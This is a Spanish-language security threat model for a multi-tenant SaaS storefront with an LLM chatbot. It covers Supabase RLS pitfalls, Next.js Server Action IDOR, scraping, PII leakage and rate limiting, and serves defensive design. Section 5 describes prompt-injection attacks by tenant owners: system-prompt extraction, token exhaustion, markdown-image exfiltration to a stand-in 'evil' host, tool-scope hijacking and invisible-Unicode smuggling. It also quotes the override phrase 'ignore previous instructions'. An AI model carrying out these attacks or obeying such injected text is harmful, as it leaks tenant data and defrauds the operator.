# R7 - Amenazas de un SaaS multi-tenant con vidriera publica: IDOR, scraping, prompt injection
_Consultado: 2026-08-27 - Agente: researcher_

## Pregunta

Modelo de amenazas de iStock (Next.js App Router + Supabase + vidriera publica en `{slug}.maat.work` + chatbot LLM con texto escrito por el dueño del tenant). Siete frentes:
RLS multi-tenant hoy · errores clasicos de RLS que filtran entre tenants · IDOR por Server Actions y props de RSC · scraping de la vidriera vs SEO y cache · prompt injection cuando el atacante es el **dueño** del tenant · fuga de PII en el payload de Next · rate limiting sin infra extra en Vercel.
Invariantes duras: **IMEI y `cost_usd` nunca salen a vidriera, logs ni contexto del chatbot**; **tenant A nunca lee datos de B**.

## Respuesta corta

- **RLS: claim en el JWT + `(select ...)` + índice + filtro explícito.** `tenant_id` va en `app_metadata` vía Custom Access Token Hook, **nunca en `user_metadata`** (el usuario lo edita solo: lint `0015_rls_references_user_metadata`, severidad ERROR). Envolver la función en `(select ...)` convierte la evaluación por-fila en un InitPlan por-query: Supabase mide **178.000 ms → 12 ms** en `has_role()` y **11.000 ms → 7 ms** en `is_admin()` con join. Con ese wrap, la diferencia JWT-claim vs tabla `memberships` deja de ser **100.000 evaluaciones** (una por fila, sobre la tabla de 100K filas del benchmark de Supabase) y pasa a ser **1 subquery por statement**: la decisión real es *frescura*, no performance.
- **Costo de frescura del JWT: hasta 3600 s.** El access token de Supabase expira por default en **1 hora** y "sessions are not proactively destroyed... the check is enforced whenever a session is refreshed next". Un dueño expulsado sigue leyendo su tenant hasta 1 h. Mínimo recomendado por Supabase: **no bajar de 5 min**.
- **El agujero #1 no es RLS, es la secret key.** `sb_secret_` / `service_role` tiene `BYPASSRLS` a nivel Postgres. OWASP LLM01:2026 Escenario #9 cita el caso real: General Analysis dumpeó una DB de producción a través del MCP de Supabase corriendo `service_role`, **saltando RLS**. Regla iStock ya escrita en `CLAUDE.md` §2 ("query sin filtro de tenant además de RLS = rechazo") es exactamente la defensa correcta.
- **IDOR: cada Server Action es un endpoint POST público.** Docs de Next.js 16.3.3 (2026-08-25): "A page-level authentication check does not extend to the Server Actions defined within it". Peor: **CVE-2026-64643** (2026-07-22) permite descubrir Action IDs desde chunks estáticos sin autenticar. Piso obligatorio: **Next.js ≥ 16.2.11** (o ≥ 15.5.21) y **React ≥ 19.2.1 / 19.1.2 / 19.0.1** (CVE-2025-55182, CVSS 10.0).
- **Scraping: el precio es público por diseño; no gastes en defenderlo.** El producto ES "pegá el link en un estado de IG". Bloquear scrapers y cachear agresivo **sí** están en tensión, pero solo si filtrás en el origen. En Vercel el WAF se evalúa **antes de que el proxy haga el lookup de cache** y antes de la función: la doc de request lifecycle ordena TLS → DDoS → WAF → proxy (routing) → Vercel Cache → compute, y un `Deny` "does not reach your application" y "does not incur Edge Requests or Fast Data Transfer". Así que Deny/Challenge **no fragmenta tu cache**. El Bot Protection ruleset **excluye automáticamente verified bots** (Googlebot) ⇒ no rompe SEO. Servir contenido distinto a Googlebot **sí** es cloaking y viola las spam policies de Google.
- **Prompt injection del dueño: las defensas de prompt NO aguantan.** Nasr et al. (2025): ataques adaptativos superan **90% de éxito** contra la mayoría de **12** defensas que reportaban "near-zero". Pai (2026, 3.510 trials): spotlighting **reduce a la mitad en Claude Haiku y no aporta nada en Llama 3.1 8B** — que es justo nuestro fallback (`llama-3.1-8b-instant`). Conclusión: la mitigación real es **que IMEI y costo nunca entren al contexto** y que el bot **no tenga ninguna tool con alcance fuera del tenant**.
- **Rate limiting sin Redis: `@vercel/firewall`.** `checkRateLimit()` cuenta en el edge de Vercel, sin Redis, con `rateLimitKey` propia (ej. `slug:ip`). **iStock va sí o sí a Vercel Pro**: "Hobby teams are restricted to non-commercial personal use only. All commercial usage of the platform requires either a Pro or Enterprise plan", y "advertising the sale of a product or service" está listado como uso comercial — la vidriera lo es. En **Pro** entran **40 reglas de rate limit + 40 custom rules** por proyecto, con lo que las dos reglas que este doc recomienda (vidriera + chatbot) conviven. En **Hobby** no entran: **1 sola regla de rate limit y 3 custom rules**. Ventana **10 s – 10 min**, keys IP/JA4. Caveat de diseño: **los contadores son por región**, el límite global efectivo es N×límite.

## Detalle

### 1. Patrón de RLS multi-tenant recomendado HOY (2026)

**Los dos patrones**

| | Claim `tenant_id` en el JWT | Tabla `memberships` consultada con `auth.uid()` |
|---|---|---|
| Cómo llega el dato | Custom Access Token Hook (función PL/pgSQL que corre *antes* de emitir el token) escribe el claim | La policy hace un subquery contra `memberships` |
| Costo por query | 0 lecturas extra. `auth.jwt()` lee el token ya parseado | 1 InitPlan **si** se envuelve en `(select ...)`; **N lecturas (una por fila)** si no |
| Frescura | Stale hasta que expire el token (**default 3600 s**) | Inmediata |
| Fuente de verdad | Duplicada (tabla + token) | Única |
| Riesgo de config | Poner el claim en `user_metadata` = el usuario forja su `tenant_id` | Recursión de policies si `memberships` también tiene RLS |

**El matiz que casi toda la literatura de blog se saltea.** El framing "memberships = un SELECT extra por query" está mal enunciado. El problema real que mide Supabase es el **init-plan**: si la policy llama `auth.uid()` o una función directo dentro de `USING(...)`, Postgres la re-evalúa **una vez por fila**. Envuelta en `(select ...)`, el planner la iza a un InitPlan que corre **una vez por statement**. Benchmarks oficiales de Supabase (troubleshooting `Z5Jjwv`):

- `is_admin()` con join a otra tabla: **11.000 ms → 7 ms**
- `has_role() = role`: **178.000 ms → 12 ms**
- `team_id = any(user_teams())`: **173.000 ms → 16 ms**
- índice sobre la columna de la policy: **171 ms → <0,1 ms**, "improvement seen over 100x on large tables"
- `TO authenticated` en vez de public: **170 ms → <0,1 ms** para el usuario anon
- filtro explícito en la query *además* de RLS (`.eq('tenant_id', x)`): **171 ms → 9 ms**

Es decir: **una tabla `memberships` bien envuelta rinde como un claim de JWT en el mismo orden de magnitud.** La elección se decide por *frescura* y por *superficie de error*, no por latencia.

**Recomendación para iStock (híbrido, sin invento):**

1. `memberships(tenant_id, user_id, role)` es la **fuente de verdad**, con su propia RLS.
2. El Custom Access Token Hook copia `tenant_id` al JWT (bajo `app_metadata`, que según docs "cannot be updated by the user, so it's a good place to store authorization data").
3. Las policies de las tablas calientes (`listings`, `units`, `reservations`) usan el claim, envuelto:

```sql
-- referencia, no implementación: la escribe db-agent
create policy units_tenant_read on public.units
  for select to authenticated
  using ( tenant_id = ((select auth.jwt() -> 'app_metadata' ->> 'tenant_id'))::uuid );
create index on public.units (tenant_id);
```

4. **Toda** policy de INSERT/UPDATE lleva `with check` con la misma expresión (ver §2).
5. Operaciones sensibles a revocación (invitar/expulsar usuarios, cambiar plan, borrar tenant) **no** confían en el claim: releen `memberships` en el servidor. Alternativa complementaria: forzar `refreshSession()` al mutar membresías.
6. `set search_path = ''` en toda función `security definer` (lint `0011_function_search_path_mutable`).

**Impacto en performance, dicho sin vueltas:** con claim + índice + `TO authenticated` + filtro explícito, la policy aporta ~0 al plan (es un `tenant_id = const` sobre índice). Con `memberships` sin envolver, el mismo query puede pasar de milisegundos a minutos en tablas grandes. El lint `0003_auth_rls_initplan` (WARN) detecta exactamente ese caso y **tiene que estar limpio como gate de merge**.

### 2. Errores clásicos de RLS que producen fuga entre tenants (con síntoma)

Lista derivada del **Supabase Database Linter** (fuente primaria: cada ítem es una regla con ID y severidad) más los dos que el linter no ve.

| # | Error | Lint / severidad | Síntoma observable |
|---|---|---|---|
| 1 | RLS no habilitado en tabla del schema `public` | `0013_rls_disabled_in_public` (ERROR) | Cualquiera con la URL del proyecto y la publishable key lee/edita/borra **toda** la tabla vía PostgREST. Test cruzado A→B devuelve filas de B. |
| 2 | Policies escritas pero RLS apagado | `0007_policy_exists_rls_disabled` (**ERROR**) | El dashboard muestra policies "correctas" y la data sigue 100% expuesta. El más traicionero: parece hecho. |
| 3 | RLS encendido sin policies | `0008_rls_enabled_no_policy` (INFO) | Falla cerrado: todo devuelve `[]` / 200 vacío. No filtra, pero genera el `TODO: después el RLS` que `CLAUDE.md` §2 prohíbe. |
| 4 | **Policy sin `WITH CHECK`** | (no hay lint) | Docs Supabase: "If no `with check` expression is defined, the `using` expression decides both which rows are visible and which new rows are allowed". Síntoma: el tenant A **lee** bien, pero puede `INSERT` una fila con `tenant_id = B`, o `UPDATE` una fila propia moviéndola a B ("stops a user from reassigning `user_id` to someone else"). Se detecta solo con un test que intente escribir un `tenant_id` ajeno. |
| 5 | **Vista `SECURITY DEFINER` (default de Postgres)** | `0010_security_definer_view` (ERROR) | "A view in the public schema runs with elevated privileges and **ignores Row-Level Security**". Síntoma: la tabla base está blindada y `select * from v_listings` devuelve todos los tenants. Fix: `create view ... with (security_invoker = on)` (Postgres ≥15). |
| 6 | Vista materializada expuesta a la API | `0016_materialized_view_in_api` (WARN) | "Materialized views can't be protected by RLS, so all their data is visible to every API user". Un dashboard de métricas cross-tenant es la trampa típica. |
| 7 | Foreign table expuesta | `0017_foreign_table_in_api` (WARN) | Mismo síntoma que #6: RLS no aplica. |
| 8 | Policy que lee `user_metadata` | `0015_rls_references_user_metadata` (ERROR) | "end users can freely modify, allowing them to bypass access controls". Síntoma: el atacante llama `supabase.auth.update()` seteando `tenant_id` del vecino y **la RLS lo deja pasar**. Es el escalado a tenant ajeno más barato que existe. |
| 9 | `USING (true)` / `USING (1=1)` | `0024_rls_policy_always_true` (WARN) | RLS "activa" y sin efecto. **Ojo con el nombre**: `0024_permissive_rls_policy` es sólo el ancla de la página de docs; el linter emite `rls_policy_always_true` (archivo `0024_rls_policy_always_true.sql`), que es por lo que hay que grepear el output. |
| 10 | Múltiples policies permissive sobre la misma tabla | `0006_multiple_permissive_policies` (WARN) | Semántica OR acumulativa: "access can become broader than intended". Se agrega una policy nueva para un caso puntual y se ensancha el acceso global. |
| 11 | `SECURITY DEFINER` sin `search_path` fijo | `0011_function_search_path_mutable` (WARN) | Función hijackeable resolviendo objetos no intencionados. Fix: `set search_path = ''`. |
| 12 | Vista que expone `auth.users` | `0002_auth_users_exposed` (ERROR) | Emails/teléfonos de todos los usuarios servidos por la API. |
| 13 | Columnas sensibles accesibles vía API | `0023_sensitive_columns_exposed` (ERROR) | **Este es el nuestro**: una tabla con columnas tipo identificador personal accesible sin restricción. `imei` y `cost_usd` deben estar en tablas/columnas que la vidriera nunca puede alcanzar. |
| 14 | **Secret key en el servidor sin filtro de tenant** | (no hay lint, no lo ve la DB) | `sb_secret_` / `service_role` corre con `BYPASSRLS`: "full access to your project's data, bypassing Row Level Security". Síntoma: **no hay síntoma en dev**. Todo funciona; el día que un handler olvida el `.eq('tenant_id')`, devuelve el universo. Precedente real citado por OWASP LLM01:2026 (Escenario #9): General Analysis dumpeó una DB de producción vía el MCP de Supabase corriendo `service_role`. |
| 15 | `auth.uid()` / funciones sin envolver | `0003_auth_rls_initplan` (WARN) | No filtra, degrada: evaluación por fila. Escala mal y termina empujando a alguien a "sacar la RLS para que ande". |

**Gate operativo sugerido:** el linter de Supabase es ejecutable; los ítems 4 y 14 no los ve nadie salvo un test. Por eso `db-agent` ya tiene contractualmente el test "tenant A no lee tenant B" — hay que extenderlo a "tenant A no **escribe** con `tenant_id` de B".

### 3. IDOR en Next.js App Router: por dónde se escapa la data

Fuente primaria: `nextjs.org/docs/app/guides/data-security`, versión **16.3.3**, `lastUpdated: 2026-08-25`.

**Qué se serializa realmente al cliente**

- **Props de Client Components.** Que el campo no se renderice en el JSX **no** significa que no viaje. El ejemplo canónico de los docs es literal: `<Profile user={userData} />` con `userData = SELECT *` → "EXPOSED: This exposes all the fields in userData to the client because we are passing the data from the Server Component to the Client", y el checklist de auditoría pregunta "**`"use client"` files:** Are the Component props expecting private data? Are the type signatures overly broad?". (Ambas verbatim de `data-security.mdx`, líneas 147 y 608.)
- **Data no usada en un Server Component: NO viaja.** Si el RSC la lee y no la baja como prop, no entra al payload.
- **Return values de Server Actions.** "Server Action return values are serialized and sent to the client. Only return what the UI needs, not raw database records."
- **Variables capturadas por closure en acciones inline: viajan, pero encriptadas** con una private key por build. Los docs son explícitos: "We don't recommend relying on encryption alone".
- **Argumentos de `.bind(...)`: NO están encriptados.** Es el opt-out de performance. Un `deletePost.bind(null, post.id)` manda el id en claro (para nosotros: nunca bindear `unit_id` junto con nada sensible, y nunca bindear `cost_usd`).
- **Las clases custom no cruzan al cliente.** "Transferring custom classes is not supported and will result in an error" — **esta cita es del blog de Markbåge (2023-10-23), no de `data-security.mdx`**, donde no aparece. De ahí el truco: usar `class` para los records del DAL, así el intento de pasarlos entero **rompe el build**. El comportamiento sigue vigente en RSC; la atribución correcta es el blog.

**Por dónde entra el IDOR**

1. **Server Action = endpoint POST público.** "even if a Server Action or utility function is not imported elsewhere in your code, it can still be called externally". Protecciones built-in: solo POST, comparación `Origin` vs `Host` (CSRF), action IDs encriptados no determinísticos **cacheados máximo 14 días** y regenerados por build, y dead-code elimination de acciones sin usar.
2. **Auth de página ≠ auth de acción.** "A page-level authentication check does not extend to the Server Actions defined within it."
3. **Authn ≠ authz.** Los docs mandan el check de propiedad explícito y linkean el cheat sheet de IDOR de OWASP.
4. **`params` y `searchParams` son input hostil.** "Folders with brackets are user input". Para iStock: `{slug}` del host y `/[unitId]` se validan con Zod y se cruzan contra el tenant del sesión — nunca se asume que estar en `/{team}/` da acceso a ese team.
5. **CVE-2026-64643 (2026-07-22, MODERATE):** "Server Action IDs can be disclosed to unauthenticated users via publicly served client artifacts (for example, static chunks containing action references)". El workaround oficial es la regla de oro: *"Never assume any authentication claims at the `use cache` or `use server` boundary. Always authenticate within the boundary."*
6. **`proxy.ts` no es una capa de autorización.** En Next.js 16 `middleware.ts` se renombró a `proxy.ts` (runtime Node.js, edge no soportado, `middleware.ts` deprecado). CVE-2025-29927 (CRITICAL, CVSS 9.1) fue exactamente "authorization bypass if the authorization check occurs in middleware". Para iStock `proxy.ts`/`middleware.ts` hace **routing por host** (slug → vidriera) y nada más.

**Cómo auditarlo (checklist textual de los docs, aplicable a review de PR):**
- ¿Hay un DAL aislado? ¿`process.env` y el cliente de DB se importan **solo** ahí?
- Archivos `"use client"`: ¿los props esperan data privada? ¿las firmas de tipo son demasiado amplias?
- Archivos `"use server"`: ¿los argumentos se validan? ¿se re-autoriza dentro? ¿se chequea **ownership** del recurso? ¿los return values están filtrados? ¿el acceso a DB está delegado a un módulo `server-only`?
- `/[param]/`: ¿validado?
- `proxy.ts` y `route.ts`: auditoría extra, pentest.

### 4. Scraping de la vidriera pública: ¿problema real? y el trade-off cache vs bots

**Es un problema de negocio, no de costo.** Los tres números del negocio:

- La vidriera es ISR/CDN con objetivo de **95% de hits sin tocar Postgres** (`CLAUDE.md` §3). Un scraper que baja 200 fichas cachadas cuesta egress de CDN y **cero** Postgres, cero LLM. El daño técnico es despreciable.
- El daño competitivo es real y trivial de ejecutar: precios USD+ARS, condición, GB y stock están en HTML estático, indexable. Un competidor con un `curl` en cron tiene tu lista de precios cada mañana. **No hay mitigación técnica que lo evite sin romper el producto**, porque el producto es "pegá el link en un estado de IG y que el visitante llegue informado". **El tamaño de ese daño en el Alto Valle es un juicio de negocio sin dato: va a `## UNVERIFIED`.** La conclusión técnica (no fragmentar cache, no hacer cloaking) no depende de él.
- Contexto: los bots son entre **34,94%** y **57,5%** del tráfico web según qué se mida (ver contradicción en §Fuentes). Vercel lo resume como "Bots generate nearly half of all internet traffic".

**La tensión, explicitada.** Cachear agresivo y bloquear bots chocan **si el filtro vive en el origen**:
- Si decidís bot/no-bot **dentro de la app** (RSC leyendo `User-Agent`), la respuesta deja de ser cacheable o necesitás `Vary: User-Agent` → fragmentás el cache por cada UA del planeta y perdés el 95%.
- Si servís contenido distinto a Googlebot, eso **es cloaking**: "presenting different content to users and search engines with the intent to manipulate search rankings", violación de las spam policies de Google, con manual action posible.

**La salida: filtrar en el edge, antes del cache.** Dos hechos de fuente primaria, que son cosas distintas:

1. **Orden dentro del firewall** (`/docs/vercel-firewall`, 2026-08-11, verbatim): "Rule execution order: 1. DDoS mitigation rules 2. WAF IP blocking rules 3. WAF custom rules 4. WAF Managed Rulesets". Esta página **no** dice nada del CDN.
2. **Posición respecto del cache** (`/docs/fundamentals/infrastructure`, 2026-08-11): las secciones van en este orden — "How Vercel secures requests **before they reach your application**" (TLS → system DDoS → WAF) → "How the proxy routes requests" ("**After passing security checks**, the request enters the proxy") → "How Vercel caches" ("the proxy checks the **Vercel Cache**"). Y `/docs/vercel-firewall/firewall-concepts` sobre la acción Deny: "The request does not reach your application. The request **does not incur Edge Requests or Fast Data Transfer**."

De ahí la conclusión operativa: el filtro vive fuera de la app, no necesita `Vary`, y un `Deny`/`Challenge` no toca tu clave de cache ni tu ISR (y ni siquiera factura Edge Request).

**Lo que tiene sentido hacer (y lo que no):**

| Medida | Efecto sobre scraping | Efecto sobre SEO | Efecto sobre cache | Veredicto |
|---|---|---|---|---|
| `AI Bots Managed Ruleset` en **Deny** | Corta crawlers de LLM (lista mantenida por Vercel, se actualiza sola) | Nulo: no incluye Googlebot | Nulo (edge) | **Sí.** Gratis en configuración, decisión de negocio: ¿querés aparecer en respuestas de ChatGPT o no? |
| `Bot Protection Managed Ruleset` en **Challenge** | Corta `curl` disfrazado de Chrome y automatización sin browser | Nulo: "automatically excludes verified bots, such as Google's crawler" | Nulo (edge) | **Sí, pero en Log primero.** Ojo: "Bot Protection doesn't work when a reverse proxy (Cloudflare, Azure, other CDNs) is placed in front of your Vercel deployment". iStock usa Cloudflare **solo para R2/imágenes**, no como proxy del app: mantener esa separación. |
| WAF rate limit por IP en las rutas de vidriera | Frena el scraping masivo, no el paciente | Nulo si excluís verified bots | Nulo (edge) | **Sí, en Pro** (40 reglas). Ventana 60 s / 100 req por default. **En Hobby no**: con 1 sola regla de rate limit disponible, la prioridad es el endpoint del chatbot, no el HTML público. |
| Bloquear por `User-Agent` en la app | Inútil (se falsifica) | Riesgo de cloaking | **Rompe el cache** | **No.** |
| Ocultar precio hasta un click / JS | Baja scraping casual | Rompe SEO y rompe el "llega informado" | Rompe ISR | **No.** Contradice el gate de aceptación de ficha pública. |
| `robots.txt` | Solo detiene bots que obedecen | Correcto usarlo | Nulo | **Sí, pero es un cartel, no una puerta.** Vercel documenta un patrón de **honeypot** para cazar a los que lo ignoran. |
| BotID Deep Analysis sobre el HTML de la vidriera | Efectivo | — | — | **No: $1 cada 1000 llamadas.** Sería pagar por proteger data pública. Reservarlo para el endpoint del chatbot. |

**Regla de asignación de gasto:** proteger lo que **cuesta plata por request** (el endpoint del chatbot → tokens de LLM; búsquedas/filtros que peguen a Postgres), no el HTML cacheado que ya cuesta ~0.

**Verificar Googlebot correctamente** (nunca por UA): rDNS que termine en `googlebot.com`/`google.com`/`googleusercontent.com` con forward-confirm, o los rangos publicados en `https://developers.google.com/static/crawling/ipranges/common-crawlers.json` (verificado hoy: HTTP 200, `creationTime` 2026-08-26). **La URL `https://www.gstatic.com/crawling/ipranges/common-crawlers.json` que este doc publicó antes devuelve 404** — `gstatic.com` sólo sirve `ipranges/goog.json`, que es otra lista (todo Google, no crawlers).

### 5. Prompt injection donde el atacante es el DUEÑO del tenant

Este es el caso menos cubierto por la literatura y el más aplicable a iStock: el texto de la descripción del listing lo escribe el dueño, es **contenido semi-confiable en superficie confiable**, y termina en un prompt que corre con **nuestra** API key, **nuestro** system prompt y potencialmente **nuestras** tools.

OWASP LLM01:2026 lo tipifica: "Trusted surfaces. The developer's own repositories, databases, internal documents... The developer may not realize an attacker has placed content here". Y arranca con la mala noticia estructural: *"no reliable prevention mechanism exists today"*; "Defense is therefore architectural rather than interceptive".

**Qué puede lograr un dueño malicioso**

*Contra su propio chatbot (impacto bajo-medio, casi todo auto-infligido):*
1. **Extraer el system prompt y los schemas de tools** (LLM08:2026 Hidden Context Exposure). Se lleva nuestra lógica de dieta de contexto y de pricing. Mitigación: asumir que es público. "Practitioners should design under the assumption that hidden context is discoverable"; nunca credenciales ni datos de otros tenants ahí.
2. **Hacer que el bot mienta a sus propios clientes** (LLM07 Misinformation): "iCloud libre", garantía inexistente, batería inflada. Riesgo de consumo/legal para él y reputacional para iStock.

*Contra iStock (impacto alto — acá está la plata):*
3. **Unbounded Consumption (LLM06):** una descripción que instruya al modelo a responder siempre lo más largo posible multiplica tokens de salida en **cada visita a la vidriera**. Es un ataque económico directo contra nuestro margen. Mitigación: los caps ya definidos (≤1200 in / ≤180 out, `temperature: 0.2`, sin thinking) son control de seguridad, no solo de costo — **hay que hacerlos hard-fail server-side, no una sugerencia del prompt**. Sumar cuota diaria de tokens por tenant y rate limit por `slug:ip`.
4. **Improper Output Handling (LLM10):** lograr que el bot emita `![](https://evil/?q=...)` o un link, y que la vidriera lo auto-renderice → canal de exfiltración y/o XSS. Mitigaciones textuales de OWASP: encoding contextual de la salida, CSP estricta, y "Disable auto-rendering of Markdown images, link previews, iframes... by default. Where rendering is required, restrict fetches to an explicit allowlist of origins". **Para iStock: la salida del bot se renderiza como texto plano. Sin markdown, sin HTML, sin links auto-linkificados.**

*Contra otros tenants (impacto crítico — pero solo si la arquitectura lo permite):*
5. **Vía tools.** Si el bot tiene una tool `searchListings(query)` cuyo filtro de tenant viene del prompt o del argumento en vez de estar clavado server-side, la inyección la reescribe. Mitigación LLM01 #4: "Hold credentials and state-change capability in application code, not the model, and grant least privilege per operation". El `tenant_id` **no puede ser un parámetro de la tool**: se inyecta desde el server a partir del host.
6. **Vía pgvector compartido (LLM09).** "Enforce tenant scoping **inside the index query**, not as a post-retrieval filter, and validate it server-side. A client-supplied scope is a suggestion, not a control." El escenario #2 es literal el nuestro: SaaS multi-tenant con un índice compartido y filtro en la capa de app → el tenant A infiere por score/timing la existencia y el tema del contenido de B. En iStock los embeddings son de `catalog_models` (global, seed/update, no por tenant) — **eso hoy nos salva**; si alguna vez se embeben descripciones de listings, el filtro va dentro del `where` del k-NN + RLS.
7. **Vía envenenamiento persistente.** Si hubiera memoria o corpus RAG compartido: "As few as five poisoned documents have reached roughly 90% attack success against a knowledge base of millions of texts". iStock no tiene memoria persistente del chatbot → **no la agregues**.

**Estado real de las técnicas de mitigación (2026) — con números**

| Técnica | Evidencia vigente |
|---|---|
| Delimitadores / spotlighting / separación instrucciones-datos | Reduce ASR en tests **no adaptativos**. OWASP #6: "This reduces attack success in non-adaptive tests only: an attacker who knows the marking scheme can mimic it, and StruQ was bypassed under adaptive attack". Pai (2026): spotlighting **corta a la mitad en Claude Haiku y no da beneficio en Llama 3.1 8B**. |
| Paráfrasis del contenido antes de procesarlo | La más consistente del benchmark: **−55% a −84%** de ASR según modelo. Costo: una llamada extra de LLM por turno (para nosotros, inaceptable en hot path; **sí** viable en el momento del *guardado* de la descripción, que es raro). |
| Sanitización / clasificadores | "Semantic filters are evadable by rephrasing or encoding". Regex sola no alcanza. |
| Strip de Unicode invisible | **Barato y obligatorio**: tag-block `U+E0000–E007F`, variation selectors `U+FE00–FE0F`, zero-width `U+200B/200C/200D/2060`, en **ingest y en render**. Precedente: el PoC de ASCII smuggling en M365 Copilot exfiltró un código MFA de Slack. |
| Output filtering / schema estricto | OWASP #2: validar en código de aplicación con validación **estructural**, no con una segunda llamada al LLM. Caveat: "a schema-valid response can still carry a malicious SQL query or an exfiltration-formatted email body". |
| Defensas de prompt en general | Nasr et al. (2025): **>90% de éxito adaptativo contra la mayoría de 12 defensas** que reportaban near-zero. OWASP #11 pide directamente "reject static-only attack-success claims". |
| Regla de los Dos (Meta AI, 2025-10-31) | Verbatim: un agente "must satisfy no more than two of the following three properties within a session": "[A] process untrustworthy inputs", "[B] access to sensitive systems or private data", "[C] change state or communicate externally". OWASP LLM01:2026 la adopta como mitigación #8: "Budget agent capabilities with the Rule of Two as a floor (Meta AI, 2025)". **Sacá una pata.** |
| Lethal trifecta (Willison, 2025) | OWASP LLM01:2026: "Simon Willison's 'lethal trifecta' (2025) restates the same structural diagnosis as a pre-deployment check: an agent that can simultaneously access private data, ingest untrusted content, and communicate externally has the conditions for high-impact exploitation, and removing any one leg removes them." |

**Traducción a arquitectura iStock (esto es lo único que aguanta un atacante adaptativo):**
- **(B) fuera:** el contexto del chatbot recibe un DTO whitelisteado — modelo, GB, color, condición, batería %, garantía, precio USD/ARS, punto de retiro. **Sin `imei`, sin `cost_usd`, sin `margin`, sin `internal_notes`, sin `tenant_id` de nadie más.** Es LLM02 Tier 1 #2: "Minimize context: send only task-required fields".
- **(C) fuera:** el bot **no tiene tools de escritura** y no puede emitir URLs. Cero side effects.
- **(A) contenido:** la descripción del dueño entra en un bloque de datos etiquetado y saneado (strip de Unicode invisible + longitud máxima), no como instrucción.
- Guardrail económico: caps de tokens hard, cuota diaria por tenant, rate limit por IP+slug.
- Evals de `packages/ai` con corpus de inyección **adaptativo** (descripciones que ya conocen nuestros delimitadores), no solo "ignore previous instructions".

### 6. Fuga de PII en payloads de Next: qué mirar y cómo auditarlo en CI

**Corrección de nomenclatura:** `__NEXT_DATA__` es **Pages Router**. En App Router el vector es el **RSC Flight payload**: embebido en el HTML inicial y servido en navegación cliente con `Content-Type: text/x-component`, en requests con el search param `?_rsc=`. Auditar `__NEXT_DATA__` en un proyecto App Router es auditar el archivo equivocado.

**Superficies a auditar, por orden de probabilidad de fuga:**
1. Props de Client Components (la #1 por lejos).
2. Return values de Server Actions.
3. Args de `.bind()` (no encriptados).
4. `NEXT_PUBLIC_*` en el bundle.
5. Mensajes de error: en producción React manda solo un hash y reemplaza el mensaje; en dev van en texto plano. "It's important to always run Next.js in production mode for production workloads."
6. **Cache poisoning de respuestas: CVE-2026-64648 / CVE-2026-64647** (2026-07-22) — "A server-side `fetch` with a request body may return a cached **response** body from a different request to the same URL but different body. Confidential data in the POST's response body would then leak to unauthorized requests." **Alcance declarado por el advisory, que hay que respetar antes de entrar en pánico:** el disparador es `fetch(new Request(init), aDifferentInit)` — "This only applies to fetch calls with a request that has a different init than the one passed to fetch" — y "Applications using Pages Router are not vulnerable". Severidad **MODERATE, CVSS 6.0**; afecta Next.js >=13.0.0 <15.5.21 y >=16.0.0 <16.2.11. Con ese disparador, en una app App Router con cache agresivo y multi-tenant, es fuga cross-tenant vía cache. **No hay workaround: "No workaround exists besides upgrading."** Regla operativa para iStock: ningún `fetch` server-side debe reusar un `Request` con un `init` distinto — y aun así, upgrade.

**Defensas en capas (todas de fuente primaria):**
- **DAL + DTO** como práctica única de acceso a datos. Los docs recomiendan explícitamente elegir *un* approach y no mezclar: "Exceptions pop out as suspicious".
- `import 'server-only'` en el DAL → **build error** si un Client Component lo importa.
- Usar `class` para los records internos: "Transferring custom classes is not supported and will result in an error" → el intento de bajar el record entero rompe el build.
- Taint APIs, con su limitación declarada:

```js
// next.config.js  (config, no código de app)
module.exports = { experimental: { taint: true } };
```

  `experimental_taintObjectReference` funciona **por referencia, no por valor**: `const { imei } = getUnit(...)` lo evade. Los propios docs: "even this doesn't block derived values... It's better to avoid data getting into the Server Components in the first place".

**Cómo se audita automáticamente en CI (patrón; no hay herramienta oficial de Vercel/Next para esto — ver UNVERIFIED):**
1. **Test de dominio (ya contractual):** `publicListingDTO` stripea `imei`, `cost_*`, `internal_notes`. Es la barrera barata y determinista.
2. **Test e2e de payload (Playwright, `qa-agent`):** para una vidriera semilla con datos conocidos, bajar (a) el HTML SSR y (b) la respuesta `?_rsc=` de una navegación cliente, y **fallar** si aparece cualquiera de: el IMEI semilla, el `cost_usd` semilla como string, `internal_notes`, `margin`, `service_role`, `sb_secret_`, `SUPABASE_SERVICE`. Buscar el **valor**, no solo el nombre del campo — el nombre puede estar minificado, el valor no.
3. **Grep del build:** `grep -RIl` sobre `.next/static/chunks` y `.next/server` buscando los mismos literales y los prefijos de secretos. Falla el PR.
4. **Grep de superficie:** listar todo `NEXT_PUBLIC_` nuevo en el diff y exigir aprobación manual (`CLAUDE.md` §5 ya lo pide "a mano" — automatizarlo como diff-check).
5. **Lint de arquitectura:** ningún import de `@supabase/*` ni de `packages/db` fuera del DAL; ningún archivo `"use client"` con un prop tipado como el record interno.
6. **Supabase linter** en CI. Bloqueantes: **`0002`, `0007`, `0010`, `0013`, `0015`, `0023`** (los seis son severidad ERROR en el propio linter) más **`0003`, `0008`, `0016`, `0017`, `0024`** (WARN/INFO que subimos a bloqueantes por diseño). `0007` es **ERROR**, no INFO: es el caso "policies escritas + RLS apagado", o sea tabla 100% expuesta que en el dashboard parece hecha — dejarlo fuera del gate anula el propósito del gate.

### 7. Rate limiting sin infra extra en Vercel

| Opción | Requiere Redis | Límites / precio | Veredicto iStock |
|---|---|---|---|
| **WAF Rate Limiting (regla de dashboard)** | No | **Pro (nuestro plan): 40 reglas/proyecto**, keys IP / JA4, fixed window 10 s–10 min; facturado **$0,50 por 1.000.000 Allowed Requests** (precio regional), contra el credit mensual de USD 20. Hobby (referencia): **1 regla/proyecto**, 3 custom rules totales, primeros 1.000.000 requests incluidos. Default de la UI: 60 s / 100 requests. Acciones: 429 / Log / Deny / Challenge. | **Primera línea.** Empezar en **Log** para medir sin bloquear. |
| **`@vercel/firewall` → `checkRateLimit()`** | **No** | Contadores en el edge de Vercel. `rateLimitKey` propia (ej. `${slug}:${ip}`). Requiere **su propia** regla con condición `@vercel/firewall` y Rate limit ID en el dashboard — o sea, **consume una segunda regla de rate limit**. | **Sí, para el endpoint del chatbot.** Es exactamente "rate limit por tenant sin Redis". **Presupuesto de reglas:** vidriera + chatbot = 2 reglas. Entra en Pro (40), **no** entra en Hobby (1). |
| **BotID Basic** | No | **Gratis en todos los planes.** | **Sí**, en signup y en el endpoint del chatbot. |
| **BotID Deep Analysis** | No | **$1 / 1000 llamadas a `checkBotId()`**, solo Pro. Solo se cobra si llamás la función. | Solo si aparece abuso medido. No preventivo. |
| Contador en Postgres (Supabase) | No | Sin costo de vendor nuevo, pero **una escritura por request** | **No** para la vidriera (viola el 95% sin Postgres). Aceptable únicamente en rutas ya autenticadas del panel. |
